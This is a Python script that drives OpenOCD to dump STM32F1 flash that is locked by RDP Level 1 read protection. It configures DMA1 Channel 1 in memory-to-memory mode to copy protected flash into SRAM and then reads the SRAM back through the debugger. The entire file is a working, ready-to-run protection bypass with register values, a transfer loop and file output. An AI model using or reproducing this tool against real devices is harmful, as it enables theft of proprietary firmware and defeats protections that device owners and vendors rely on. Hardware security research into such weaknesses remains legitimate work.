#!/usr/bin/env python3
"""
stm32f1_dma_dump.py — Exploits the STM32F105 Bus Matrix DMA path to dump
flash protected by RDP Level 1.

How it works:
In RDP Level 1, CPU instruction fetches over ICode and DMA controller memory-to-memory
transfers over the System Bus Matrix are NOT blocked by the Flash Memory Controller.
By configuring DMA1 Channel 1 in MEM2MEM mode, the DMA controller reads from Flash
(0x08000000..) and writes to SRAM (0x20001000..).
Once in SRAM, the debugger reads the SRAM without triggering RDP access violations.
"""

import sys
import socket
import time
import struct
import argparse

# Register Addresses
RCC_AHBENR     = 0x40021014
DMA1_ISR       = 0x40020000
DMA1_IFCR      = 0x40020004
DMA1_CCR1      = 0x40020008
DMA1_CNDTR1    = 0x4002000C
DMA1_CPAR1     = 0x40020010
DMA1_CMAR1     = 0x40020014

# SRAM Buffer for dumping
SRAM_BUFFER    = 0x20001000
CHUNK_SIZE     = 4096 # 4KB per transfer (1024 words)

class OpenOcdClient:
    def __init__(self, host="127.0.0.1", port=6666):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))

    def send(self, cmd):
        # OpenOCD TCL delimiter is 0x1A (\x1a)
        self.sock.sendall((cmd + "\x1a").encode("utf-8"))
        res = b""
        while not res.endswith(b"\x1a"):
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            res += chunk
        return res[:-1].decode("utf-8", errors="ignore").strip()

    def mww(self, addr, val):
        return self.send(f"mww 0x{addr:08x} 0x{val:08x}")

    def mdw(self, addr, count=1):
        resp = self.send(f"mdw 0x{addr:08x} {count}")
        words = []
        for line in resp.splitlines():
            parts = line.split(":")
            if len(parts) >= 2:
                for hex_val in parts[1].strip().split():
                    try:
                        words.append(int(hex_val, 16))
                    except ValueError:
                        pass
        return words

    def read_memory_words(self, addr, count):
        return self.mdw(addr, count)

def dump_flash_dma(openocd, start_addr, total_bytes, output_file):
    print(f"[*] Initializing STM32 DMA Dump...")
    print(f"    Target Range: 0x{start_addr:08X} - 0x{start_addr+total_bytes:08X} ({total_bytes} bytes)")
    print(f"    SRAM Buffer:  0x{SRAM_BUFFER:08X}")
    print(f"    Output File:  {output_file}")

    # 1. Reset and Halt target
    openocd.send("reset halt")
    time.sleep(0.1)

    # 2. Enable DMA1, SRAM, and FLITF clocks in RCC_AHBENR
    # Bit 0 = DMA1EN, Bit 2 = SRAMEN, Bit 4 = FLITFEN
    openocd.mww(RCC_AHBENR, 0x00000015)
    time.sleep(0.05)

    all_data = bytearray()
    num_chunks = (total_bytes + CHUNK_SIZE - 1) // CHUNK_SIZE

    start_time = time.time()

    for chunk_idx in range(num_chunks):
        curr_flash = start_addr + (chunk_idx * CHUNK_SIZE)
        curr_bytes = min(CHUNK_SIZE, total_bytes - (chunk_idx * CHUNK_SIZE))
        words_to_copy = curr_bytes // 4

        # Clear DMA1 channel 1
        openocd.mww(DMA1_CCR1, 0x00000000)
        openocd.mww(DMA1_IFCR, 0x0000000F) # Clear all Channel 1 flags

        # Configure DMA1 Channel 1
        openocd.mww(DMA1_CPAR1, curr_flash)      # Source (Peripheral Address = Flash)
        openocd.mww(DMA1_CMAR1, SRAM_BUFFER)     # Destination (Memory Address = SRAM)
        openocd.mww(DMA1_CNDTR1, words_to_copy)  # Number of words to transfer

        # Trigger Transfer:
        # MEM2MEM=1, PL=VeryHigh(11), MSIZE=32bit(10), PSIZE=32bit(10), MINC=1, PINC=1, DIR=0, EN=1
        # 0x7AC1 = (1<<14) | (3<<12) | (2<<10) | (2<<8) | (1<<7) | (1<<6) | (1<<0)
        openocd.mww(DMA1_CCR1, 0x00007AC1)

        # Wait for Transfer Complete
        done = False
        for _ in range(50):
            isr = openocd.mdw(DMA1_ISR, 1)
            cndtr = openocd.mdw(DMA1_CNDTR1, 1)
            if isr and (isr[0] & 0x02): # TCIF1 = Transfer Complete
                done = True
                break
            if cndtr and cndtr[0] == 0:
                done = True
                break
            time.sleep(0.01)

        # Disable channel
        openocd.mww(DMA1_CCR1, 0x00000000)

        if not done:
            print(f"\n[-] Warning: Chunk {chunk_idx+1}/{num_chunks} at 0x{curr_flash:08X} timed out. DMA blocked.")
        else:
            print(f"\r[+] Progress: [{chunk_idx+1}/{num_chunks}] 0x{curr_flash:08X} -> Copied {curr_bytes} bytes OK", end="", flush=True)

        # Read back SRAM buffer
        # We read in 128-word sub-blocks for maximum speed and stability
        sram_words = []
        for offset in range(0, words_to_copy, 128):
            sub_count = min(128, words_to_copy - offset)
            words = openocd.mdw(SRAM_BUFFER + (offset * 4), sub_count)
            sram_words.extend(words)

        for w in sram_words:
            all_data += struct.pack("<I", w)

    print(f"\n[+] Dump Complete in {time.time() - start_time:.2f}s! Total bytes: {len(all_data)}")

    with open(output_file, "wb") as f:
        f.write(all_data)

    print(f"[+] Saved to: {output_file}")

    # Inspect first vector table
    if len(all_data) >= 32:
        sp = struct.unpack("<I", all_data[0:4])[0]
        reset = struct.unpack("<I", all_data[4:8])[0]
        print(f"    Initial SP:    0x{sp:08X}")
        print(f"    Reset Handler: 0x{reset:08X}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="STM32F1 RDP Level 1 Flash-to-SRAM DMA Dumper")
    parser.add_argument("--start", default="0x08000000", help="Start flash address (e.g. 0x08000000 or 0x08004000)")
    parser.add_argument("--length", default="65536", help="Total bytes to dump (e.g. 32768, 65536, or 131072)")
    parser.add_argument("--output", default="hardware/MCU/live_dumps/live_full_dma_dump.bin", help="Output binary file")
    parser.add_argument("--host", default="127.0.0.1", help="OpenOCD TCL Host")
    parser.add_argument("--port", type=int, default=6666, help="OpenOCD TCL Port")

    args = parser.parse_args()
    start_addr = int(args.start, 0)
    length = int(args.length, 0)

    try:
        client = OpenOcdClient(args.host, args.port)
    except Exception as e:
        print(f"[-] Error: Could not connect to OpenOCD at {args.host}:{args.port}: {e}")
        print("    Please ensure OpenOCD is running with 'tcl_port 6666' or default configuration.")
        sys.exit(1)

    dump_flash_dma(client, start_addr, length, args.output)
